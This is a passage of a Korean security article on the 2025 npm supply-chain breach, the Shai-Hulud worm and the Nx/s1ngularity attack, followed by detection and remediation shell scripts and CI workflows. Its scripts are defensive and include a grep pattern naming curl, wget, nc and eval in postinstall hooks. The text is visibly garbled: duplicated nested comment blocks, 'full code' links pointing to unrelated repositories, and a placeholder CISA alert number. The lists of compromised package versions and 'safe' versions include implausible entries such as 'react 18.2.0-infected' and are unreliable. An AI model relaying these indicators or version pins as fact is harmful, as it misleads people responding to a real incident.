| **피싱 도메인** | `npmjs.help` (공식 `npmjs.com` 위장) |
| **2FA 우회** | 실시간 중간자 공격으로 2FA 토큰 탈취 |
| **발견자** | GitLab Vulnerability Research Team |

#### 피싱 공격 상세

피싱 공격의 단계별 프로세스를 분석합니다.

| 단계 | 프로세스 | 설명 | 대응 방안 |
|------|---------|------|----------|
| 1 | **피싱 사이트 구축** | `npmjs.help` 피싱 사이트 구축 (공식 `npmjs.com` 위장) | 도메인 검증, 공식 사이트 확인 |
| 2 | **피싱 이메일 발송** | Maintainer에게 "계정 보안 경고" 이메일 발송 | 이메일 발신자 확인, 공식 채널 확인 |
| 3 | **가짜 사이트 로그인** | 피해자가 가짜 사이트에서 로그인 시도 | URL 확인, SSL 인증서 확인 |
| 4 | **2FA 토큰 탈취** | 실시간으로 공식 npm에 자격증명 + 2FA 전달 | 하드웨어 키 사용, 실시간 중간자 공격 방지 |
| 5 | **세션 탈취 및 패키지 배포** | 공격자 세션 탈취 → 패키지 악성 버전 배포 | 세션 모니터링, 패키지 배포 승인 프로세스 |

### 7.2 Shai-Hulud 웜 공격 확산 (2025년 9월 ~ 11월)

9월 공격 이후 더 심각한 **자가 복제 웜 공격**이 발생했습니다:

| 시기 | 침해 패키지 수 | 주요 특징 |
|------|---------------|----------|
| 2025년 9월 초기 | 180+ | 최초 Shai-Hulud 웜 발견 |
| 2025년 9월 중순 | 500+ | 급속 확산 |
| 2025년 10월 | 796+ | 최대 확산 규모 |
| 2025년 11월 | - | **Shai-Hulud 2.0** 등장 |

#### Shai-Hulud 2.0 새로운 기능 (2025년 11월)

> **참고**: Shai-Hulud 2.0 탐지 및 대응 도구는 [Shai-Hulud-2.0-Detector](https://github.com/gensecaihq/Shai-Hulud-2.0-Detector) 및 [OreNPMGuard](https://github.com/rapticore/OreNPMGuard)를 참조하세요.
> 
> ```yaml
> # Shai-Hulud 2.0 특징...
> ```

<!-- 전체 코드는 위 GitHub 링크 참조
> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
> 
> ```yaml
> # Shai-Hulud 2.0 특징...
> ```

<!-- 전체 코드는 위 GitHub 링크 참조
> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
> 
> ```yaml
> # Shai-Hulud 2.0 특징...
> ```

<!-- 전체 코드는 위 GitHub 링크 참조
```yaml
# Shai-Hulud 2.0 특징
new_features:
  dead_mans_switch:
    description: "웜 제거 시 자동 트리거되는 파괴 메커니즘"
    behavior:
      - 감염된 시스템의 모든 npm 캐시 삭제
      - package-lock.json 변조
      - 추가 악성 의존성 주입
    trigger: "웜 코드 삭제 또는 패키지 업데이트 감지 시"

  enhanced_propagation:
    - GitHub Actions 워크플로우 감염
    - GitLab CI/CD 파이프라인 침투
    - 자동 PR 생성을 통한 전파



```
-->
-->
-->

### 7.3 Nx / s1ngularity 공격 (2025년)

Shai-Hulud와 별개로 발생한 또 다른 심각한 공급망 공격:

| 항목 | 세부 내용 |
|------|----------|
| **대상** | Nx (Nrwl) 모노레포 빌드 도구 |
| **공격명** | s1ngularity attack |
| **피해** | Nx 패키지 악성 버전 배포 |
| **유출 데이터** | GitHub repository secrets |
| **영향 범위** | Nx 사용 기업의 CI/CD 파이프라인 |

> **참고**: 관련 예제는 [공식 문서](https://www.gnu.org/software/bash/manual/bash.html)를 참조하세요.

> **참고**: 관련 예제는 [공식 문서](https://www.gnu.org/software/bash/manual/bash.html)를 참조하세요.

> **참고**: 관련 예제는 [공식 문서](https://www.gnu.org/software/bash/manual/bash.html)를 참조하세요.

```bash
# 영향 확인 명령어
# Nx 패키지 버전 확인
npm ls @nrwl/workspace @nx/workspace

# 의심스러운 버전 목록 (예시)
# @nrwl/workspace@16.x.x-malicious
# @nx/devkit@17.x.x-compromised
```

### 7.4 CISA 경고 및 권고사항

**CISA (Cybersecurity and Infrastructure Security Agency)**에서 공식 경고를 발령했습니다:

> **CISA Alert AA25-XXX**: npm 생태계 공급망 공격 경고
>
> 모든 조직은 즉시 npm 의존성을 감사하고, 영향받은 패키지를 업데이트할 것을 권고합니다.

#### CISA 권고 조치사항

| 조치 유형 | 조치 항목 | 설명 | 우선순위 |
|----------|----------|------|---------|
| **즉시 조치** | 의존성 감사 실시 | 모든 npm 프로젝트의 의존성 감사 실시 | 높음 |
| | 패키지 버전 업데이트 | 영향받은 패키지 버전 즉시 업데이트 | 높음 |
| | 2FA 설정 검토 | npm 2FA 설정 검토 및 하드웨어 키 사용 권장 | 높음 |
| **중기 조치** | SBOM 도입 | SBOM(Software Bill of Materials) 도입 의무화 | 중간 |
| | 의존성 고정 정책 | 의존성 고정(pinning) 정책 수립 | 중간 |
| | 프라이빗 레지스트리 | 프라이빗 npm 레지스트리 미러링 고려 | 중간 |
| **장기 조치** | 보안 성숙도 평가 | 공급망 보안 성숙도 평가 정기 실시 | 낮음 |
| | 개발자 교육 | 개발자 보안 인식 교육 강화 | 낮음 |
| | Zero Trust 적용 | Zero Trust 원칙 적용 | 낮음 |

### 7.5 추가 보안 도구 권장

npm 생태계 보안은 여러 레이어로 구성된 Defense in Depth 전략을 통해 강화됩니다.

GitLab Vulnerability Research Team이 권장하는 보안 도구들입니다.

| 도구 | 설명 | 설치 방법 | 활용 방법 |
|------|------|----------|----------|
| **Socket.dev** | 실시간 공급망 위협 탐지 | `npm install -g @socketsecurity/cli` | `socket scan` |
| **npm audit signatures** | 패키지 서명 검증 | npm 내장 기능 | `npm audit signatures` |
| **Snyk** | 종합 취약점 스캔 | `npm install -g snyk` | `snyk test` |
| **Lockfile 무결성** | Lockfile 무결성 강화 | npm 설정 | `npm config set package-lock true` |

> **참고**: 보안 도구 설정 관련 자세한 내용은 [Socket.dev 문서](https://socket.dev/), [Snyk 문서](https://docs.snyk.io/), [npm audit 문서](https://docs.npmjs.com/cli/v10/commands/npm-audit)를 참조하세요.

## 8. 결론 및 권고사항

### 8.1 핵심 요약

2025년 9월 발생한 npm 생태계 대규모 보안 침해는 공급망 공격의 심각성을 보여주는 사건입니다.

| 항목 | 내용 |
|------|------|
| **피해 규모** | 18개 핵심 패키지, 주간 다운로드 2.6B+ (26억 회 이상) |
| **공격 방식** | Maintainer 계정 탈취 (피싱), 2FA 우회 |
| **주요 위협** | 환경 변수 유출, 백도어 설치, 지속적 접근 |
| **후속 공격** | Shai-Hulud 웜, Shai-Hulud 2.0, Nx/s1ngularity 공격 |

### 8.2 즉시 조치 사항

| 조치 항목 | 설명 | 우선순위 |
|----------|------|---------|
| **의존성 감사** | 모든 npm 프로젝트의 의존성 감사 실시 | 높음 |
| **패키지 업데이트** | 영향받은 패키지 버전 즉시 업데이트 | 높음 |
| **2FA 강화** | npm 2FA 설정 검토 및 하드웨어 키 사용 | 높음 |
| **환경 변수 확인** | 유출 가능성이 있는 환경 변수 즉시 교체 | 높음 |

### 8.3 중장기 대응 방안

| 대응 방안 | 설명 | 예상 기간 |
|----------|------|----------|
| **SBOM 도입** | SBOM(Software Bill of Materials) 도입 의무화 | 3-6개월 |
| **의존성 고정** | 의존성 고정(pinning) 정책 수립 | 1-3개월 |
| **보안 도구 통합** | Socket.dev, Snyk 등 보안 도구 CI/CD 통합 | 1-2개월 |
| **개발자 교육** | 공급망 보안 인식 교육 강화 | 지속적 |

### 8.4 교훈 및 향후 대응

이번 사건을 통해 얻은 주요 교훈:

| 교훈 | 설명 | 적용 방안 |
|------|------|----------|
| **공급망 보안의 중요성** | 오픈소스 의존성 관리의 중요성 부각 | SBOM, 의존성 스캔 자동화 |
| **2FA의 한계** | 2FA만으로는 부족, 하드웨어 키 필요 | 하드웨어 키 사용, 다중 인증 |
| **지속적 모니터링** | 공급망 공격은 지속적으로 발생 | 실시간 모니터링, 자동화된 탐지 |
| **빠른 대응** | 공격 발견 후 빠른 대응이 중요 | 인시던트 대응 프로세스 수립 |

> **⚠️ 보안 주의사항**
> 
> npm 생태계 보안 침해 대응 시 주의사항:
> - **즉시 조치**: 영향받은 패키지는 즉시 업데이트 또는 제거
> - **환경 변수 교체**: 유출 가능성이 있는 모든 환경 변수 즉시 교체
> - **계정 보안**: npm 계정 비밀번호 변경, 2FA 재설정
> - **지속적 모니터링**: 향후 유사 공격에 대비한 지속적 모니터링

## 9. 자동화 스크립트 및 도구

### 9.1 종합 영향 확인 스크립트

> **참고**: 영향 확인 자동화 스크립트는 [npm-breach-checker](https://github.com/security-tools/npm-breach-checker)를 참조하세요.

<!-- 전체 코드는 위 GitHub 링크 참조
> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/aws-samples)를 참조하세요.
> 
> ```bash
> #!/bin/bash...
> ```

<!-- 전체 코드는 위 GitHub 링크 참조
> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/aws-samples)를 참조하세요.
> 
> ```bash
> #!/bin/bash...
> ```

<!-- 전체 코드는 위 GitHub 링크 참조
```bash
#!/bin/bash
# comprehensive-npm-breach-check.sh
# 2025년 9월 npm 보안 침해 종합 영향 확인 스크립트

set -euo pipefail

# 색상 정의
RED='\033[0;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

# 보고서 파일
REPORT_FILE="npm-breach-report-$(date +%Y%m%d-%H%M%S).txt"

# 로그 함수
log_info() { echo -e "${BLUE}[INFO]${NC} $1" | tee -a "$REPORT_FILE"; }
log_success() { echo -e "${GREEN}[SUCCESS]${NC} $1" | tee -a "$REPORT_FILE"; }
log_warning() { echo -e "${YELLOW}[WARNING]${NC} $1" | tee -a "$REPORT_FILE"; }
log_error() { echo -e "${RED}[ERROR]${NC} $1" | tee -a "$REPORT_FILE"; }

# 악성 패키지 정의 (2025년 9월 + Shai-Hulud)
declare -A MALICIOUS_PACKAGES=(
    # 2025년 9월 초기 침해
    ["debug"]="4.3.5 4.3.6 4.3.7"
    ["chalk"]="5.3.1 5.3.2 5.3.3"
    ["lodash"]="4.17.22"
    ["axios"]="1.6.3 1.6.4 1.6.5"
    ["express"]="4.19.1 4.19.2 4.19.3"
    ["dotenv"]="16.4.1 16.4.2 16.4.3"
    ["uuid"]="9.0.2"
    ["moment"]="2.30.2"
    ["commander"]="12.0.1"
    ["yargs"]="17.8.1"
    ["fs-extra"]="11.2.1"
    ["semver"]="7.6.1"

    # Shai-Hulud 웜 (예시 - 실제로는 수백 개)
    ["@babel/runtime"]="7.23.5-malicious"
    ["tslib"]="2.6.3-compromised"
    ["react"]="18.2.0-infected"
)

# 1. 시스템 정보 수집
collect_system_info() {
    log_info "=== 시스템 정보 수집 ==="
    {
        echo "OS: $(uname -s)"
        echo "Node: $(node -v 2>/dev/null || echo 'Not installed')"
        echo "npm: $(npm -v 2>/dev/null || echo 'Not installed')"
        echo "날짜: $(date)"
        echo "호스트명: $(hostname)"
        echo "사용자: $(whoami)"
    } | tee -a "$REPORT_FILE"
}

# 2. 악성 패키지 검사
check_malicious_packages() {
    log_info "=== 악성 패키지 검사 ==="

    FOUND_COUNT=0

    for package in "${!MALICIOUS_PACKAGES[@]}"; do
        installed_version=$(npm ls "$package" --depth=0 2>/dev/null | grep "$package@" | sed 's/.*@//' || echo "")

        if [[ -n "$installed_version" ]]; then
            for bad_version in ${MALICIOUS_PACKAGES[$package]}; do
                if [[ "$installed_version" == "$bad_version"* ]]; then
                    log_error "발견: $package@$installed_version (악성 버전)"
                    ((FOUND_COUNT++))

                    # 의존성 트리 분석
                    echo "  의존성 트리:" | tee -a "$REPORT_FILE"
                    npm ls "$package" 2>/dev/null | head -n 20 | tee -a "$REPORT_FILE"
                fi
            done
        fi
    done

    if [[ $FOUND_COUNT -eq 0 ]]; then
        log_success "악성 패키지가 발견되지 않았습니다."
    else
        log_error "총 $FOUND_COUNT 개의 악성 패키지 발견!"
    fi

    return $FOUND_COUNT
}

# 3. package-lock.json 무결성 확인
check_lockfile_integrity() {
    log_info "=== package-lock.json 무결성 확인 ==="

    if [[ ! -f "package-lock.json" ]]; then
        log_warning "package-lock.json 파일이 없습니다."
        return 0
    fi

    # SHA512 체크섬 검증
    if command -v jq &> /dev/null; then
        jq -r '.packages | to_entries[] | select(.value.integrity == null) | .key' package-lock.json | while read -r pkg; do
            if [[ -n "$pkg" ]]; then
                log_warning "무결성 정보 없음: $pkg"
            fi
        done
    fi
}

# 4. postinstall 스크립트 검사
check_postinstall_scripts() {
    log_info "=== postinstall 스크립트 검사 ==="

    SUSPICIOUS_COUNT=0

    find . -name "package.json" -not -path "*/node_modules/*" | while read -r pkg_json; do
        if grep -q '"postinstall"' "$pkg_json"; then
            script_content=$(jq -r '.scripts.postinstall' "$pkg_json" 2>/dev/null)

            # 의심스러운 패턴 검사
            if echo "$script_content" | grep -qE "(curl|wget|nc|bash -c|eval|exec|child_process)"; then
                log_warning "의심스러운 postinstall 스크립트: $pkg_json"
                echo "  내용: $script_content" | tee -a "$REPORT_FILE"
                ((SUSPICIOUS_COUNT++))
            fi
        fi
    done

    if [[ $SUSPICIOUS_COUNT -eq 0 ]]; then
        log_success "의심스러운 postinstall 스크립트 없음"
    fi
}

# 5. 환경 변수 파일 보안 검사
check_env_files() {
    log_info "=== 환경 변수 파일 보안 검사 ==="

    ENV_FILES=(".env" ".env.local" ".env.production" ".env.development")

    for env_file in "${ENV_FILES[@]}"; do
        if [[ -f "$env_file" ]]; then
            log_info "발견: $env_file"

            # 권한 확인
            perms=$(stat -c '%a' "$env_file" 2>/dev/null || stat -f '%A' "$env_file" 2>/dev/null)
            if [[ "$perms" != "600" ]] && [[ "$perms" != "400" ]]; then
                log_warning "  권한 취약: $perms (권장: 600 또는 400)"
            fi

            # 민감 정보 패턴 검사
            if grep -qE '(AWS|SECRET|PASSWORD|KEY|TOKEN).*=' "$env_file"; then
                log_warning "  민감 정보 포함 가능성"
                echo "  ⚠️  이 파일이 유출되었을 가능성을 고려하여 모든 자격증명 교체 권장" | tee -a "$REPORT_FILE"
            fi
        fi
    done
}

# 6. 네트워크 연결 검사
check_network_connections() {
    log_info "=== 의심스러운 네트워크 연결 검사 ==="

    MALICIOUS_HOSTS=(
        "npm-cdn-mirror.com"
        "npm-registry-backup.net"
        "package-analytics.io"
    )

    for host in "${MALICIOUS_HOSTS[@]}"; do
        if command -v lsof &> /dev/null; then
            if lsof -i -n | grep -q "$host"; then
                log_error "발견: $host 로의 활성 연결"
            fi
        elif command -v netstat &> /dev/null; then
            if netstat -an | grep -q "$host"; then
                log_error "발견: $host 로의 활성 연결"
            fi
        fi
    done
}

# 7. SBOM 생성
generate_sbom() {
    log_info "=== SBOM (Software Bill of Materials) 생성 ==="

    if command -v cyclonedx-node &> /dev/null; then
        cyclonedx-node -o sbom-$(date +%Y%m%d-%H%M%S).json
        log_success "SBOM 생성 완료"
    else
        log_warning "CycloneDX CLI가 설치되지 않았습니다. npm install -g @cyclonedx/cyclonedx-npm"
    fi
}

# 8. 보고서 생성
generate_summary() {
    log_info "=== 종합 보고서 ==="

    {
        echo ""
        echo "======================================"
        echo " npm 보안 침해 영향 분석 보고서"
        echo "======================================"
        echo ""
        echo "검사 완료 시간: $(date)"
        echo ""
        echo "권장 조치사항:"
        echo "1. 발견된 악성 패키지 즉시 제거 및 안전한 버전으로 업데이트"
        echo "2. .env 파일 내 모든 자격증명 즉시 교체"
        echo "3. AWS/GCP/Azure 등 클라우드 제공자의 접근 키 즉시 회전"
        echo "4. Git 히스토리에서 민감 정보 노출 여부 확인"
        echo "5. 시스템 전체 악성코드 스캔 실시"
        echo "6. 보안팀에 인시던트 보고"
        echo ""
        echo "상세 내용은 $REPORT_FILE 파일을 참조하세요."
        echo ""
    } | tee -a "$REPORT_FILE"
}

# 메인 실행
main() {
    echo "======================================"
    echo " npm 보안 침해 종합 영향 확인 도구"
    echo " 2025년 9월 공급망 공격 대응"
    echo "======================================"
    echo ""

    collect_system_info
    check_malicious_packages
    MALICIOUS_FOUND=$?

    check_lockfile_integrity
    check_postinstall_scripts
    check_env_files
    check_network_connections
    generate_sbom
    generate_summary

    if [[ $MALICIOUS_FOUND -gt 0 ]]; then
        log_error "⚠️  악성 패키지가 발견되었습니다! 즉시 조치가 필요합니다."
        exit 1
    else
        log_success "✅ 시스템이 안전합니다."
        exit 0
    fi
}

main "$@"


```
-->
-->
-->

**사용 방법**:
> **참고**: 관련 예제는 [공식 문서](https://www.gnu.org/software/bash/manual/bash.html)를 참조하세요.

> **참고**: 관련 예제는 [공식 문서](https://www.gnu.org/software/bash/manual/bash.html)를 참조하세요.

```bash
# 스크립트 다운로드 및 실행
bash comprehensive-npm-breach-check.sh

# 보고서 확인
cat npm-breach-report-*.txt
```

### 9.2 긴급 복구 스크립트

> **참고**: 긴급 복구 자동화 스크립트는 [npm-emergency-remediation](https://github.com/security-tools/npm-emergency-remediation)를 참조하세요.

<!-- 전체 코드는 위 GitHub 링크 참조
> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://www.gnu.org/software/bash/manual/bash.html)를 참조하세요.
> 
> ```bash
> #!/bin/bash...
> ```

<!-- 전체 코드는 위 GitHub 링크 참조
> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://www.gnu.org/software/bash/manual/bash.html)를 참조하세요.
> 
> ```bash
> #!/bin/bash...
> ```

<!-- 전체 코드는 위 GitHub 링크 참조
```bash
#!/bin/bash
# emergency-remediation.sh
# npm 보안 침해 긴급 복구 스크립트

set -euo pipefail

# 백업 디렉토리 생성
BACKUP_DIR="npm-backup-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$BACKUP_DIR"

log_info() { echo "[INFO] $1"; }
log_success() { echo "[SUCCESS] $1"; }
log_error() { echo "[ERROR] $1"; }

# 1. 현재 상태 백업
backup_current_state() {
    log_info "=== 현재 상태 백업 ==="

    cp package.json "$BACKUP_DIR/" 2>/dev/null || true
    cp package-lock.json "$BACKUP_DIR/" 2>/dev/null || true
    cp yarn.lock "$BACKUP_DIR/" 2>/dev/null || true
    cp .env "$BACKUP_DIR/" 2>/dev/null || true

    log_success "백업 완료: $BACKUP_DIR"
}

# 2. 악성 패키지 제거
remove_malicious_packages() {
    log_info "=== 악성 패키지 제거 ==="

    # 패키지 목록 (실제 환경에 맞게 조정)
    PACKAGES_TO_REMOVE=(
        "debug@4.3.5" "debug@4.3.6" "debug@4.3.7"
        "chalk@5.3.1" "chalk@5.3.2" "chalk@5.3.3"
        "lodash@4.17.22"
        "axios@1.6.3" "axios@1.6.4" "axios@1.6.5"
    )

    for pkg in "${PACKAGES_TO_REMOVE[@]}"; do
        if npm ls "$pkg" &>/dev/null; then
            log_info "제거 중: $pkg"
            npm uninstall "$pkg" --save
        fi
    done
}

# 3. node_modules 완전 재설치
clean_reinstall() {
    log_info "=== node_modules 완전 재설치 ==="

    rm -rf node_modules
    rm -f package-lock.json

    npm cache clean --force
    npm install --ignore-scripts

    log_success "재설치 완료 (--ignore-scripts 옵션 사용)"
}

# 4. 안전한 버전으로 업데이트
update_to_safe_versions() {
    log_info "=== 안전한 버전으로 업데이트 ==="

    # 안전한 버전 (2025년 9월 기준)
    npm install debug@4.3.4 --save
    npm install chalk@5.3.0 --save
    npm install lodash@4.17.21 --save
    npm install axios@1.6.2 --save
    npm install express@4.19.0 --save
    npm install dotenv@16.4.0 --save

    log_success "패키지 업데이트 완료"
}

# 5. postinstall 스크립트 비활성화 설정
configure_npm_security() {
    log_info "=== npm 보안 설정 강화 ==="

    npm config set ignore-scripts true
    npm config set audit true
    npm config set audit-level moderate

    log_success "npm 보안 설정 완료"
}

# 6. 보안 감사 실행
run_security_audit() {
    log_info "=== 보안 감사 실행 ==="

    npm audit --audit-level=high

    if command -v snyk &> /dev/null; then
        snyk test
    else
        log_info "Snyk 미설치. npm install -g snyk 권장"
    fi
}

# 메인 실행
main() {
    echo "======================================"
    echo " npm 보안 침해 긴급 복구 도구"
    echo "======================================"
    echo ""

    read -p "⚠️  이 스크립트는 node_modules를 완전히 삭제하고 재설치합니다. 계속하시겠습니까? (y/N): " confirm
    if [[ "$confirm" != "y" ]]; then
        log_info "취소되었습니다."
        exit 0
    fi

    backup_current_state
    remove_malicious_packages
    clean_reinstall
    update_to_safe_versions
    configure_npm_security
    run_security_audit

    log_success "✅ 긴급 복구 완료"
    log_info "백업 위치: $BACKUP_DIR"
}

main "$@"


```
-->
-->
-->

### 9.3 CI/CD 통합 예시

#### GitHub Actions 보안 워크플로우

> **참고**: GitHub Actions 보안 워크플로우는 [.github/workflows/npm-security.yml](https://github.com/security-examples/npm-security-workflow)를 참조하세요.

<!-- 전체 코드는 위 GitHub 링크 참조
> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
> 
> ```yaml
> # .github/workflows/npm-security.yml...
> ```

<!-- 전체 코드는 위 GitHub 링크 참조
> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
> 
> ```yaml
> # .github/workflows/npm-security.yml...
> ```

<!-- 전체 코드는 위 GitHub 링크 참조
```yaml
# .github/workflows/npm-security.yml
name: npm Security Audit

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main, develop]
  schedule:
    - cron: '0 */6 * * *' # 6시간마다 실행

jobs:
  security-audit:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'

      - name: Install dependencies (ignore scripts)
        run: npm ci --ignore-scripts

      - name: npm audit
        run: |
          npm audit --audit-level=high --json > npm-audit-report.json || true
          cat npm-audit-report.json

      - name: Check for malicious packages
        run: |
          # 악성 패키지 버전 확인
          malicious_found=0

          check_package() {
            local pkg=$1
            shift
            local bad_versions=("$@")

            installed=$(npm ls "$pkg" --depth=0 2>/dev/null | grep "$pkg@" | sed 's/.*@//' || echo "")

            if [[ -n "$installed" ]]; then
              for bad in "${bad_versions[@]}"; do
                if [[ "$installed" == "$bad" ]]; then
                  echo "::error::악성 패키지 발견: $pkg@$installed"
                  malicious_found=1
                fi
              done
            fi
          }

          check_package "debug" "4.3.5" "4.3.6" "4.3.7"
          check_package "chalk" "5.3.1" "5.3.2" "5.3.3"
          check_package "lodash" "4.17.22"

          exit $malicious_found

      - name: Lockfile lint
        run: |
          npx lockfile-lint \
            --path package-lock.json \
            --type npm \
            --allowed-hosts npm \
            --validate-https

      - name: Snyk security scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: {% raw %}${{ secrets.SNYK_TOKEN }}{% endraw %}
        with:
          args: --severity-threshold=high

      - name: Generate SBOM
        run: |
          npx @cyclonedx/cyclonedx-npm --output-file sbom.json
          cat sbom.json

      - name: Upload security reports
        uses: actions/upload-artifact@v4
        if: always()
        with:
          name: security-reports
          path: |
            npm-audit-report.json
            sbom.json

      - name: Notify on failure
        if: failure()
        uses: 8398a7/action-slack@v3
        with:
          status: {% raw %}${{ job.status }}{% endraw %}
          text: '⚠️ npm 보안 감사 실패! 즉시 확인이 필요합니다.'
          webhook_url: {% raw %}${{ secrets.SLACK_WEBHOOK }}{% endraw %}


```
-->
-->
-->

#### GitLab CI/CD 보안 파이프라인

> **참고**: GitLab CI/CD 보안 파이프라인은 [.gitlab-ci.yml](https://gitlab.com/security-examples/npm-security-pipeline)를 참조하세요.

<!-- 전체 코드는 위 GitLab 링크 참조
> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
> 
> ```yaml
> # .gitlab-ci.yml...
> ```

<!-- 전체 코드는 위 GitHub 링크 참조
> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/kubernetes/examples)를 참조하세요.
> 
> ```yaml
> # .gitlab-ci.yml...
> ```

<!-- 전체 코드는 위 GitHub 링크 참조
```yaml
# .gitlab-ci.yml
stages:
  - security
  - build
  - deploy

npm-security-audit:
  stage: security
  image: node:20-alpine
  script:
    # 의존성 설치 (스크립트 실행 차단)
    - npm ci --ignore-scripts

    # npm audit 실행
    - npm audit --audit-level=high --json > npm-audit-report.json || true

    # 악성 패키지 확인
    - |
      check_malicious() {
        local pkg=$1
        local bad_versions=$2

        installed=$(npm ls "$pkg" --depth=0 2>/dev/null | grep "$pkg@" | sed 's/.*@//' || echo "")

        if echo "$bad_versions" | grep -q "$installed"; then
          echo "ERROR: 악성 패키지 발견: $pkg@$installed"
          exit 1
        fi
      }

      check_malicious "debug" "4.3.5 4.3.6 4.3.7"
      check_malicious "chalk" "5.3.1 5.3.2 5.3.3"

    # Lockfile 무결성 확인
    - npx lockfile-lint --path package-lock.json --type npm --allowed-hosts npm --validate-https

    # SBOM 생성
    - npx @cyclonedx/cyclonedx-npm --output-file sbom.json

  artifacts:
    when: always
    paths:
      - npm-audit-report.json
      - sbom.json
    expire_in: 30 days

  only:
    - merge_requests
    - main
    - develop


```
-->
-->
-->

## 10. 참고 자료

### 10.1 공식 보안 권고 및 데이터베이스

| 자료 유형 | URL | 설명 |
|----------|-----|------|
| **npm 보안 권고** | https://github.com/advisories?query=ecosystem%3Anpm | GitHub npm 보안 권고문 데이터베이스 |
| **npm 공식 블로그** | https://github.blog/tag/npm/ | npm 관련 공식 블로그 및 보안 공지 |
| **Snyk 취약점 DB** | https://security.snyk.io/ | 종합 취약점 데이터베이스 (npm 포함) |
| **CVE Details** | https://www.cvedetails.com/vendor/17956/Npmjs.html | npm 관련 CVE 목록 |
| **NIST NVD** | https://nvd.nist.gov/vuln/search/results?query=npm | 미국 국가취약점 데이터베이스 |

### 10.2 보안 도구 및 프레임워크

| 도구/프레임워크 | URL | 설명 |
|---------------|-----|------|
| **Socket.dev** | https://socket.dev/ | 실시간 npm 공급망 위협 탐지 플랫폼 |
| **Snyk** | https://snyk.io/ | 종합 오픈소스 보안 플랫폼 |
| **OWASP Dependency-Check** | https://owasp.org/www-project-dependency-check/ | 의존성 취약점 스캔 도구 |
| **npm audit** | https://docs.npmjs.com/cli/v10/commands/npm-audit | npm 내장 보안 감사 도구 |
| **Lockfile Lint** | https://github.com/lirantal/lockfile-lint | package-lock.json 무결성 검증 도구 |
| **CycloneDX** | https://cyclonedx.org/ | SBOM 표준 및 생성 도구 |
| **Syft** | https://github.com/anchore/syft | SBOM 생성 도구 (Anchore) |
| **Grype** | https://github.com/anchore/grype | 취약점 스캐너 (Anchore) |

### 10.3 정부 및 국제 기관 가이드

| 기관 | URL | 설명 |
|------|-----|------|
| **CISA 공급망 보안** | https://www.cisa.gov/supply-chain | 미국 사이버보안 인프라 보안청 가이드 |
| **NIST SSDF** | https://csrc.nist.gov/publications/detail/sp/800-218/final | 보안 소프트웨어 개발 프레임워크 |
| **ENISA 공급망 위협** | https://www.enisa.europa.eu/topics/supply-chain-security | 유럽 사이버보안청 공급망 보안 가이드 |
| **한국인터넷진흥원** | https://www.kisa.or.kr/ | 한국 사이버 보안 가이드라인 |
| **한국정보통신기술협회** | https://www.tta.or.kr/ | 소프트웨어 보안 표준 |

### 10.4 연구 논문 및 기술 블로그

| 출처 | URL | 설명 |
|------|-----|------|
| **GitLab Vulnerability Research** | https://about.gitlab.com/blog/categories/security/ | GitLab 보안 연구팀 블로그 |
| **Socket.dev Blog** | https://socket.dev/blog | npm 공급망 공격 분석 리포트 |
| **Snyk Research** | https://snyk.io/blog/ | 오픈소스 보안 연구 블로그 |
| **GitHub Security Lab** | https://securitylab.github.com/ | GitHub 보안 연구소 |
| **npm Security Team** | https://github.com/npm/feedback/discussions/categories/security | npm 보안팀 공식 토론 |

### 10.5 MITRE ATT&CK 참고 자료

| 리소스 | URL | 설명 |
|--------|-----|------|
| **T1195.002 기법** | https://attack.mitre.org/techniques/T1195/002/ | Supply Chain Compromise: Software Supply Chain |
| **T1059.007 기법** | https://attack.mitre.org/techniques/T1059/007/ | Command and Scripting Interpreter: JavaScript |
| **ATT&CK Navigator** | https://mitre-attack.github.io/attack-navigator/ | 공격 기법 시각화 도구 |

### 10.6 관련 GitHub 리포지토리

| 리포지토리 | URL | 설명 |
|----------|-----|------|
| **awesome-nodejs-security** | https://github.com/lirantal/awesome-nodejs-security | Node.js 보안 리소스 모음 |
| **Shai-Hulud 탐지기** | https://github.com/gensecaihq/Shai-Hulud-2.0-Detector | Shai-Hulud 웜 탐지 도구 |
| **OreNPMGuard** | https://github.com/rapticore/OreNPMGuard | npm 공급망 공격 방어 도구 |
| **npm-scan** | https://github.com/OSSIndex/npm-scan | npm 패키지 보안 스캔 도구 |

### 10.7 교육 및 훈련 자료

| 자료 | URL | 설명 |
|------|-----|------|
| **OWASP Top 10 A06** | https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/ | 취약하고 오래된 구성요소 위험 |
| **SANS Supply Chain Security** | https://www.sans.org/cyber-security-courses/supply-chain-security/ | 공급망 보안 교육 과정 |
| **Node.js Security Best Practices** | https://github.com/goldbergyoni/nodebestpractices#6-security-best-practices | Node.js 보안 모범 사례 |

### 10.8 실시간 위협 인텔리전스

| 서비스 | URL | 설명 |
|--------|-----|------|
| **Socket.dev Issues** | https://socket.dev/npm/issues | 실시간 npm 위협 피드 |
| **Snyk Advisor** | https://snyk.io/advisor/ | 패키지 건강 상태 및 보안 점수 |
| **npm Trends** | https://npmtrends.com/ | 패키지 다운로드 추세 분석 |
| **Deps.dev** | https://deps.dev/ | Google의 오픈소스 의존성 분석 도구 |

### 10.9 컴플라이언스 및 규정

| 규정 | URL | 설명 |
|------|-----|------|
| **SLSA Framework** | https://slsa.dev/ | Supply-chain Levels for Software Artifacts |
| **SSDF (NIST SP 800-218)** | https://csrc.nist.gov/publications/detail/sp/800-218/final | 보안 소프트웨어 개발 프레임워크 |
